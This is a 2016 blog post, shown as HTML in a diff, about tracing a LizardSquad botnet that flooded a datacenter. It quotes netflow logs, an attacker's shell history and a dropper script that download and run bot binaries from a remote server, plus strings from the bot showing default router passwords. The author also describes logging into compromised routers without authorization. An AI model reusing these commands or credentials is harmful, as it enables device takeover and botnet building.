@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Large TCP attack, trace down the botnet!</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//dosattack.net/themes/Casper/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="//dosattack.net/themes/Casper/assets/css/screen.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html" />
+    
+    <meta property="og:site_name" content="Adam Syed" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Large TCP attack, trace down the botnet!" />
+    <meta property="og:description" content="A friend of mine who owns a datacenter (and (D)DoS mitigation company) contacted me earlier this week asking for help with a large attack that he was being faced with, the attack was maxing out his uplinks on a..." />
+    <meta property="og:url" content="http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html" />
+    <meta property="article:published_time" content="2016-01-05T08:00:00.000Z" />
+    <meta property="article:modified_time" content="2016-01-06T07:01:58.941Z" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Large TCP attack, trace down the botnet!" />
+    <meta name="twitter:description" content="A friend of mine who owns a datacenter (and (D)DoS mitigation company) contacted me earlier this week asking for help with a large attack that he was being faced with, the attack was maxing out his uplinks on a..." />
+    <meta name="twitter:url" content="http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "Adam Syed",
+    "author": {
+        "@type": "Person",
+        "name": "Adam Syed",
+        "image": "https://avatars.githubusercontent.com/u/3879307?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://dosattack.net/"
+    },
+    "headline": "Large TCP attack, trace down the botnet!",
+    "url": "http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html",
+    "datePublished": "2016-01-05T08:00:00.000Z",
+    "dateModified": "2016-01-06T07:01:58.941Z",
+    "description": "A friend of mine who owns a datacenter (and (D)DoS mitigation company) contacted me earlier this week asking for help with a large attack that he was being faced with, the attack was maxing out his uplinks on a..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="Adam Syed" href="http://dosattack.net/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template">
+
+    
+
+
+<header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="http://dosattack.net">Home</a>
+        <!-- <a class="subscribe-button icon-feed" href="http://dosattack.net/rss/">Subscribe</a> -->
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post">
+
+        <header class="post-header">
+            <h1 class="post-title">Large TCP attack, trace down the botnet!</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2016-01-05">05 January 2016</time> 
+            </section>
+        </header>
+
+        <section class="post-content">
+            <div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p>A friend of mine who owns a datacenter (and (D)DoS mitigation company) contacted me earlier this week asking for help with a large attack that he was being faced with, the attack was maxing out his uplinks on a large TCP attack (insanely impressive considering his bandwidth!) So I thought, why not, let&#8217;s find ourselves a botnet ;)</p>
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_how_is_that_even_possible">How is that even possible?</h5>
+<div class="paragraph">
+<p>Tracking down a botnet usually is pretty difficult; however, this was pretty simple, it is actually something that we have a lot of experience in! We&#8217;re looking at another LizardSquad botnet!</p>
+</div>
+<div class="paragraph">
+<p>He sent me a flow of the attack and we got to work:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>2016-01-04 14:14:00.399     0.000 TCP     217.172.189.82:34998 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:57.224     0.000 TCP     115.202.191.90:9577  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:00.099     0.000 TCP        61.80.20.38:63603 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.168     0.000 TCP     217.172.189.82:56726 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.483     0.000 TCP     166.78.102.158:15207 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:57.009     0.000 TCP       172.98.72.53:36243 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:58.248     0.000 TCP    120.198.124.126:21322 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.348     0.000 TCP        52.11.12.20:19324 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:56.479     0.000 TCP      202.164.61.43:47872 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:57.983     0.000 TCP      107.155.95.93:45379 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:57.358     0.000 TCP      54.75.241.203:13777 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.758     0.000 TCP      14.37.200.217:16724 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:55.832     0.000 TCP       122.84.186.5:65271 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:58.501     0.000 TCP     106.185.37.124:57833 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.127     0.000 TCP      169.55.103.20:15782 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:00.085     0.000 TCP       54.67.71.210:55357 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:57.545     0.000 TCP    218.156.116.224:40416 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.833     0.000 TCP       186.46.60.98:52705 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:59.259     0.000 TCP    112.167.253.121:11766 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:13:58.287     0.000 TCP      177.92.61.253:62127 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:44.442     0.000 TCP    219.137.241.217:49522 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.377     0.000 TCP    176.102.200.142:16714 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:39.836     0.000 TCP       14.49.214.45:23117 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.194     0.000 TCP       58.16.83.203:39372 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.984     0.000 TCP       58.16.83.203:45570 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:40.431     0.000 TCP      187.112.88.35:59557 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.246     0.000 TCP       58.16.83.203:57344 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:40.932     0.000 TCP       183.54.30.68:21881 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:40.422     0.000 TCP    223.199.174.125:39834 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:39.646     0.000 TCP       58.16.83.203:12134 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.681     0.000 TCP       58.16.83.203:48121 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.234     0.000 TCP      159.192.252.6:13795 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.847     0.000 TCP       14.49.214.45:4686  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.144     0.000 TCP       58.16.83.203:24822 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.481     0.000 TCP      113.90.211.48:35364 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.192     0.000 TCP       58.16.83.203:29907 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.826     0.000 TCP     14.148.125.152:7576  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.160     0.000 TCP      183.48.13.221:11301 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.516    59.154 TCP       [redacted]:25575 -&gt;     71.88.39.227:57468        4     2421     1
+2016-01-04 14:14:44.063     0.000 TCP       14.49.214.45:60449 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.888     0.000 TCP    113.212.234.130:59028 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.847     0.000 TCP      181.196.48.86:65280 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.421     0.000 TCP      14.26.179.172:35789 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:44.884     0.000 TCP     123.171.100.63:26522 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.656     0.000 TCP    181.113.122.198:41761 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.734     0.000 TCP       58.16.83.203:40215 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.096     0.000 TCP     125.126.140.71:38937 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.000     0.000 TCP       58.16.83.203:27269 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.061     0.000 TCP     125.126.140.71:22135 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.972     0.000 TCP       [redacted]:25575 -&gt;   187.189.173.59:46214        1       40     1
+2016-01-04 14:14:41.566     0.000 TCP       14.49.214.45:12982 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:44.043     0.000 TCP       14.49.214.45:47204 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.228     0.000 TCP     123.248.43.104:10713 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.475     0.000 TCP       14.49.214.45:28415 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:40.848     0.000 TCP       14.49.214.45:35932 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:41.985     0.000 TCP       58.16.83.203:28830 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.572     0.000 TCP       14.49.214.45:39862 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:40.998     0.000 TCP    117.221.186.109:13341 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:42.333     0.000 TCP       14.49.214.45:44365 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.793     0.000 TCP       14.49.214.45:11930 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:43.460     0.000 TCP       58.16.83.203:51506 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:48.070     0.000 TCP      113.73.204.96:52410 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:48.536     0.000 TCP    113.212.234.130:37867 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.707     0.000 TCP       14.49.214.45:30316 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.355     0.000 TCP     14.148.125.152:21674 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.880     0.000 TCP     222.87.114.175:27252 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.450     0.000 TCP     222.87.114.175:65432 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.921     0.000 TCP       183.48.15.89:39099 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.877     0.000 TCP        64.129.2.28:11758 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.403     0.000 TCP     116.20.154.119:42898 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.851     0.000 TCP     183.133.39.158:1185  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.321     0.000 TCP        64.129.2.28:6104  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.916     0.000 TCP      183.12.176.91:59888 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:48.148     0.000 TCP     180.218.53.110:48611 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.377     0.000 TCP       14.49.214.45:61547 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.049     0.000 TCP      113.90.211.48:65215 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:44.619     0.000 TCP       14.49.214.45:44700 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.315     0.000 TCP        64.129.2.28:55662 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.296     0.000 TCP    113.212.234.130:63789 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:49.402     0.000 TCP     14.148.125.152:29441 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:44.855     0.000 TCP       218.63.98.30:12766 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:49.078     0.000 TCP       183.48.15.89:54063 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.983     0.000 TCP      183.48.13.221:29057 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:47.951     0.000 TCP       [redacted]:25575 -&gt;    68.36.108.162:51025        1     1500     1
+2016-01-04 14:14:49.888     0.000 TCP       [redacted]:25575 -&gt;     190.48.99.60:7368         1       40     1
+2016-01-04 14:14:49.359     0.000 TCP      14.122.74.254:5730  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:49.242     0.000 TCP       183.48.15.89:57520 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:48.881     0.000 TCP      183.12.176.91:5247  -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.822     0.000 TCP    176.102.200.148:53722 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:46.555     0.000 TCP     123.171.100.63:48344 -&gt;     [redacted]:25575        1     1440     1
+2016-01-04 14:14:45.606     0.000 TCP      183.48.13.221:10227 -&gt;     [redacted]:25575..</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now you may be thinking, how does this help us!? Well, if you look at the attacking source IPs you&#8217;ll notice that all of them have one thing in common, they&#8217;re running telnet (YES THEY ARE ROUTERS!) so we grabbed a few until we were able to login to one successfully (not rocket science) and this "hacker" wasn&#8217;t careful at all&#8230;&#8203;</p>
+</div>
+<div class="paragraph">
+<p>I ran the first command that came to mind, "history" and got prompted with</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>  316  cd /tmp || cd /tmp; rm -rf /tmp/*; wget http://176.123.7.193/w.sh; sh w.sh; tftp -r t1.sh -g 176.123.7.193; sh t1.sh; tftp 176.123.7.193 -c get t2.sh; sh t2.sh; rm -rf /tmp/*
+  317  sh
+  318  cd /tmp || cd /tmp; rm -rf /tmp/*; wget http://176.123.7.193/w.sh; sh w.sh; tftp -r t1.sh -g 176.123.7.193; sh t1.sh; tftp 176.123.7.193 -c get t2.sh; sh t2.sh; rm -rf /tmp/*</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>yay we found the server that he is fetching the files from! (Yes he is able to do something as simple as wgetting a file and make a botnet this large&#8230;&#8203;#infosec please! D:</p>
+</div>
+<div class="paragraph">
+<p>I don&#8217;t want you to go to those links becasue then he&#8217;ll have your IP logged; however, here is the "w.sh" file:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>cd /tmp;rm -rf *;wget http://176.123.7.193/dskljn;cat dskljn &gt;busybox;chmod 777 busybox;./busybox
+cd /tmp;rm -rf *;wget http://176.123.7.193/kjdnc;cat kjdnc &gt;busybox;chmod 777 busybox;./busybox
+cd /tmp;rm -rf *;wget http://176.123.7.193/sdokdljn;cat sdokdljn &gt;busybox;chmod 777 busybox;./busybox
+cd /tmp;rm -rf *;wget http://176.123.7.193/sdalk;cat sdalk &gt;busybox;chmod 777 busybox;./busybox
+cd /tmp;rm -rf *;wget http://176.123.7.193/akddx;cat akddx &gt;busybox;chmod 777 busybox;./busybox
+cd /tmp; busybox wget http://176.123.7.193/dskljn; chmod +x dskljn; ./dskljn; busybox rm -f dskljn*
+cd /tmp; busybox wget http://176.123.7.193/kjdnc; chmod +x kjdnc; ./kjdnc; busybox rm -f kjdnc*
+cd /tmp; busybox wget http://176.123.7.193/sdokdljn; chmod +x sdokdljn; ./sdokdljn; busybox rm -f sdokdljn*
+cd /tmp; busybox wget http://176.123.7.193/sdalk; chmod +x sdalk; ./sdalk; busybox rm -f sdalk*
+cd /tmp; busybox wget http://176.123.7.193/akddx; chmod +x akddx; ./akddx; busybox rm -f akddx*</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>The simplicity is killing me here, so now you might think that "THE BOTNET IS ON 176.123.7.193!!!" but it could actually not be, it&#8217;d be smarter not to be hosted on the same server but hey, nobody said this guy was smart!</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_let_s_check_the_binary">Let&#8217;s check the binary!</h5>
+<div class="paragraph">
+<p>Don&#8217;t let this scare you, it&#8217;s very simple, let&#8217;s read through the plain-text strings on the executable and see what we can find:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>-:~ suedadam$ strings /Users/suedadam/Downloads/akddx
+UPX!
+Mx[]
+T$
+  1
+PTRhD
+.@%*
+$kx#
+IUTf
+duJj
+7i^h
+^PcuT0
+{$^3
+
+
+
+%q
+M6(S4
+aoaf
+4o`(
++
+ u&gt;d
+YZ
+
+
+X(?C
+?to|
+N3@t&lt;s
+uW&amp;pr
+8q2x
+#f p
+9 =s
+~OlP
+J4$j-
+9&amp;wc
+\93r
+t%8En
+'$0H
+&lt;i| B
+tU@'x
+k }!&lt;
+,V#*4
+FGGmKNNHH
+q$zC
+$&lt;Xv
+ G`
+
+&amp;`@s
+C*RU
+&lt;g$A
+$!lC3
+{#2L
+as%,g
+Ht3b*
+
+HXK\
+LF$!
+XF`b
+1[^:HG
+0V%l
+&amp;
+ K
+
+B"&amp;g"
+ "7`BF
+
+u07
+   d
+#$Z6
+QCjNU
+B
+ CP
+qSlh
+ddlhd
+;a|P
+&gt;^SrXn
+@6CJ
+D'Dr$_
+
+8HBM
+H!^U
+#%)X
+IF8&lt;'
+40iX
+4,
+  7d_
+1&amp;$D4
+E`\$@
+`T
+  !##PL,
+r22r
+rHD@]
+H7m&lt;84
+0&lt;#g
+
+!#(O
++Fv%
+aAaD$m
+^ u
+   c
+z:i%]`
+G3Tw
+sB"S
+N*xWi
+A=#r
+6hp"
+WtQ5i{
+M#oY'
+2HHH
+rDHT$
+ohJFE*
+$"$I
+;FHm
+f*FpQ
+x!
+  K
+%6HOp
+^\$ ;
+K~7!j
+PPV_s
+J&gt;Ur
+S\ZY
+v
+ ww2
+V S9
+C7C
+   X
+h
+  &amp;
+F=k7
+XS5l;
+qV_+$
+i]Tt
+buKu
+DJ\t
+d9LQ
+wn'~k.
+in(3
+h2Oj
+ @tH
+,f
+  IRF
+PR5u
+hJ1V
+c=^&gt;!G
+N/FLY
+
+$at0
+X&amp;X ZP
+K`Uh
+4p;C
++pb%
+ ? YP
+|yd/n
+g_Uh
+'+^j-
+6,r4A
+pm^#a
+TC&amp;k
+s.Uc
+kgd,3
+?uL=m
+a8xu&gt;pZ
+
+],^
+Y{lf
+C*PG
+.a{R`TW
+TH&amp;s
+1WVz
+_q;5
+$ti;+ta
+Y'Gx
+
+@,&lt;
+7gQQ'{k
+&gt;D*~
+?a,?
+8VSw
+Qu_1
+Bf4,
+[(Tb
+ma+rX
+)%WW
+ -Fv
+:|Y2X
+f;9ue
+`X4D
+io-@
+ 4
+  B
+AxVS\
+5Wl-
+;J
+  r
+\x}p
+6DZN
+kKPxG
+J%z5
+@ g*e
+'T&amp;H
+!}-[^D
+^UC4Ae
+9mhb
+]l20
+Rw[4
+
+R0".
+IPg~
+P#qz
+ O *
+;K s
+^Z&lt;XZ[B0
+P&lt;Y[[k
+X"d`
+_-ghv
+E[?&lt;
+w66I
+Y[M,
+Wj*@
+3RR4
+
+DI{@
+EBLi
+@Pa6
+$PuF7!8
+C&lt;=s
+0Kp'pE6
+l!1u
+$4 (
+z8&gt;B8
+Sr @
+:Dcql
+qQ$kh
+X,Z-
+VtaS*B
+
+3d
+  '
+A2rY
+[LnA
+PF4+M
+-LPWS
+%IA^
+h &lt;F
+l``l
+mtkG
+CRRS
+C"tk
+IGzX;
+J3R1$&lt;
+HLnw
+A
+ HA
+&gt;iSVW
+G,_^[
+Z87,x
+PRQW!&lt;
+7}[F
+vm@G
+.P?V
+yK 83
+6s%K
+;2z
+   {W
+0L`F
+@"*L
+$m,,'
+i{
+  $
+c`C$M
+grkSa
+RRVj
+LN$)
+:es8
+X[^o
+1hww
+y+8`
+Q2$S70
+y&gt;rA
+PF,(
+S&amp;!&amp;
+$M0@|n
+~#1T
+wE~!
+VVh&gt;2
+&gt;LB-
+
+:Z4WP&amp;[
+s{.iNU$
+SD2g
+R@8&lt;m
+%tG`
+'|Dss
+
+B~@=
+B{/,
+
+F;q
+JA$k
+,\~p
+56VD
+x3%J
+RuV-
+;%:X(
+f&lt;Mb
+&lt;mtN
+U&amp;:4L
+C!j2k
+V5am
+H)l5
+e/L$
+FM!\
+mHd
+
+@)F^YF
+8JI9
+%[(XBl
+3AITU#
+@J")
+.Lt~`o
+L|`1h
+XElRd
+TCCt
+\/&lt;&gt;
+0HPh
+AehnE
+]"Lj
+{ 3r
+
+E+
+i,H0
+C.`B@
+APr-Bth
+1k%%
+ Dt1\9
+(28C
+?Q
+  9
+/||B
+Dt%@;-pE
+JmD2X4D
+;Nr[
+J\Q`j
+##)&lt;
+T0~Z
+w)(u
+&lt;p43a(
+f2#,a
+l90}
+{;ZrzZ
+]y~L
+ Vw5
+p%8N
+;X,tQ
++9k)
+p&lt;RPX
+&lt;9Atl
+w sl
+icB|A
+xO&lt;7=DX
+~ptR#.=n
+2:X\lv]Rt
+$qbi
+SSPQ)i
+9CxF
+J]ba
+B6VZ
+saZ5X
+[YXE
+dPQh
+StK34
+l5{?
+[t]i
+[4tc
+G;&lt;$l
+wKX7
+B@h4
+3E69
+KF= 2
+Y[XZ
+;0OCXRD
+(&lt;`v
+WFTa
+E.'&gt;N!
+*SE, .
+EVSf
+bU$u
+rJh%#c`
+U1B5
+~^aF
+IUB&lt;
+Y/IPPh
+r!@9
+WAAz
+5`"x
+=d)3
+x(D0
+?`Iw
+]uVP
+f0P!y
+]gUu
+" P:N#
+NU-NU
+!Q\h,
+H,PbV
+P(;M@0 K
+-rcQW
+6P,P
+"lt$
+I"n(
+;P8"Q
+Pl84
+ltbWt
+'&lt;!83
+u'z%
+6U
+  ^
+u?z=^^
+7(Q/
+[CET
+$jsd#
+d|4&gt;
+ft(
+.0Ktt
+:!l_
+"JoyD
+VzDUGQ*A
+hlcFF
+TutE
+FD,D$dX
+PruA
+3p{R[4N
+E9
+  Q
+?=;y@
+j=,a
+QUA(
+ZRj1
+m1$L
+2XHu
+
+LZYIU
+x^u*j
+3hVl3"
+~Tgt
+    bA
+nPkS
+QWjJ
+hiX%
+2P8Pb
+.-,A&amp;E
+N(E3
+HP,|6
+[pPM]"
+ ;#JT|
+Tl}II7
+3 tw
+0P@uCf
+WfQgv
+PO
+  3
+Ch, O
+=@qu*
+&lt;P:!
+Y&amp;@0
+={R:
+\PPNL\
+r[#dJ
+FXdF6QQ
+dOz"9
+XRaG
+S5H[
+SOEC
+Z `Q
+`lQ7L
+=B :
+PWVK
+&amp;,(F
+DF"r
+mHPO0
+WU6%
+Vn"Q
+    p
+9h
+  uV
+
+R@rE
+.DVH
+O;94
+oet1
+ocO
+
+ vCC
+dTv-
+X[TC
+P%N|
+/D^]
+j7kA
+UQh$
+L,A,
+T=)A
+R$N@(BT$
+RQ2ZFuWR*f
+g+kX(G
+ SQh4
+}\&lt;3DA
+dHQ-
+uVK3QQ
+DySS
+0NPQ
+tg8&amp;,
+xL*O
+oXY@
+J@t]U*4HB
+K}4m,.
+(}]C
+pFay
+4:+k
+P_,*
+A=XT
+\D-F
+7PV3P&lt;`C@7[[^7
+.u5AMmTm(A
+~[0/
+6.M
+
+ D|O+XZ
+88dd
+XA&lt;4
+O|.Vj
+k$hv-
+`Gx@p
+9(
+  x
+8@09@
+W^b[ A2:
+;ir
+Kucv
+w7At
+9js?
+t"Q&gt;
+SZ.&lt;Q
+$z-;
+@_5X
+hd1@,
+F,m,
+*lJt%
+rE4P
+a@0X
+B8jb\M
+n!W,+
+JlD'
+!'x{
+&gt;
+ -0
+(X)B
+&amp;mC
+   t
+zF5M,
+tP@y
+&amp;XZj
+[@!t{
+~&lt;\mPj
+Wd-*J
+&lt;
+ C@
+KcPp0
+@`n;bT
+SA*F*
+Qj V
+j)RH`
+oF&lt;Uq
+NPC0
+KHC2
+
+6vD
+F5(r
+:,!2_
+F00v9T%&amp;
+E`FAt
+M7hxL
+$e42
+riPh:
++^WE1
+cE0s$
+}3ch
+Oj:G
+OQ2F
+;]d|
+|RWU
+7_x9
+PFSf 6X#|
+;xwn
+xu,;^
+4C5h}
+pbKA
+tMQ3&lt;
++X29u"H
+;UUh
+B0kH]4
+FFFW
+G2(1
+Z8dP
+lt7&lt;af
+hmV{
+ Y]MpG
+#]@&gt;
+E
+ se"
+4tmP
+/RFVxB
+#(B}
+Z %0,
+9}W1z
+@p!D
+KK:;Cs
+*`DN
+4*HU["
+oKK@
+RSP)
+D=Y[[
+S'Wh
+DPP8
+XSV(4D
+B8)'
+ m@"
++uDG
+=$I!
+.uAkw
+t+FM
+fyQG
+l;4T.F
+B
+ ZN
+vwwz
+PhGT
+!%+}
+mD t)
+t{@p&lt;*
+|@d0
+7(`{J
+uw%:a
+Mm-O
+WWR\
+CLDG
+P(XQ
+$,C@
+
+A
+
+#z[FZ'
+Z%9l73
+=hi3
+bXqJ
+M;P5A
+MDwct
+K94u
+wU9#uG
+N)LlL
+OC1V
+]5Ez
+zL6G
+
++l-s^V
+`E#1
+$@OS
+*76.123.
+root
+admin
+log
+   gues
+suppor
+cisco
+0#changemem
+defaul4pass
+Svizxv
+f: %s.-c2
+gp/bw/
+lTY
+c/cpu
+om,f
+BOGOMI
+/HING
+:&gt;%$
+rectr
+d /tmp ||
+; rm -rf
+        /*
+[Xhttp://&gt;/w.
+g[kD
+g -K
+c(t1)
+wc gt2S
+Faile
+open
+rawS8ka
+s mo
+i;ea
+fla8"
+GETLOTL
+NNER
+STO6EDB
+ARTHOL/J
+DYTC
+KILLATT
+ONx
+9UBD
+DU_SH
+2&gt;&amp;1
+0.9.30
+e/l%!
+|WCG
+hlLjztqJ
+difFeEgGaACScs`+
+0-#'IJ
+Unknown "Zr
+Succe
+Op+a^o38Z
+
+mimt
+h-6#ow"
+ntnup5
+vicV
+rDArgumeI
+'maBB1k
+CscriptVT
+%pnrc
+unavRab&gt;
+2\'m;
+rubu
+oG-A
+Bap(
+X6a;T
+&amp;on5IGeg
+;Z2G5
+Z4of
+m^o2in bu
+d.,Dpx
+o$ed
+meRN
+.cCw
+e,qv
+oIft
+Ne 1
+1c
+  od1
+-sTp
+th[A
+PKag~
+fk%=*Lbj
+[RFS
+F^Xgp_Nb_
+I=aU
+!co5$n
+'lMies
+KalZ
+81er
+As#a
+kx"4r
+S|(YAx
+%,I6
+Hva'
+=(T&lt;d;
+%qXAe
+4sp&gt;qnnt
+ ponI
+us#Cc
+eMoC
+7fer
+aed'W
+mt5%#B
+: cB-`'
+VNost`V
+ENFS
+XENIX
+4`5X;
+-cP{^
+^C'6{
+L(knN
+C5a_h_\
+[%Er
+px~_
+$P:6
+j
+ H&lt;(
+EXc/f
+lv.u
+mKRPC_(
+na[uh
+'why
+),s1V8
+Ks2A*
+,xOK
+4&amp;6Y
+C]`a
+Y2&gt;;2x
+Nw)G
+
+2Vm|g
+PS,H
+eX2:k(
+~ULph
+f}ur
+eL|%
+Z-~o
+P7cy
+QUTU
+|S(f
+CAk[S
+T$(9
+H+|$,
+$Info: This file is packed with the UPX executable packer http://upx.sf.net $
+$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $
+PROT_EXEC|PROT_WRITE failed.
+D$
+  V
+/proc/sm
+elf/exe
+[jUX
+T$
+  `G
+PO6&lt;
+UPX!u
+&gt;)?`
+_um9
+@bQs
+&gt;tgco
+5Z3@
+af~{
+GCC: (GNU) 4.1.2
+2.symtab
+init
+texf
+
+roda
+eh_frame
+ctors
+got.pl3+bs
+com-n
+`'``
+5;LO
++
+ H3`
+~C2$
+/$3H
+&lt;Dwa/
+XK/7
+P ]7
+6OA&amp;
+X"_A
+_)/I
+2$C2
+C2$C
+$C2$
+9$C2
+T\c!
+_C2d!
+8I$C2$^s2$C2
+C2$C
+$C2$
+2$C2
+C2$C
+C2dC
+Zd/!_
+On?y
+dC6H
+
+5$C2
+ M3QU
+dH*=
+d5&gt;J
+VanH
+fmwH
+2dC6G?Y
+}C2$C
+$C2$
+2$C2
+C2$C
+w$C6d/
+2$C2
+`3$C
+Kb7`
+l@s/
+
+;FT
+ M3H
+7`]Y
+dH"4dH
+dEOX
+eoy
+
+B@B
+   6
+t#o"
+?"o#
+ &gt;7a7
+v_o+
+/G7 u
+O%e7
+"E+w
+^/=aw
+h'Vos?
+ OOS7`u
+/k7XT?
+!_`3X
+_^"?
+omMu
+ B`9v
+.`pB#o
+9%O[
+
